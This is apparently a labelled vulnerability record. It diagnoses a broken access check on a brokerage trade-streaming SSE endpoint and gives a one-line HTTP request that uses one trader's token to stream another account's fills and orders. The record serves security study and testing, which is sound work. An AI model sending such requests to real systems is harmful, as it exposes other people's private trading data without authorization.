diagnosis: An SSE endpoint connects to a Redis pub/sub channel using accountId from the URL path without checking if req.user.id owns the target brokerage account. Anyone can stream trade executions, fill prices, and order quantities of other traders in real time.
exploit_request:
GET /api/trading/accounts/acc_hedgefund_8819/trades-stream HTTP/1.1
Host: stream.brokerage.io
Authorization: Bearer <retail_trader_jwt>
Accept: text/event-stream
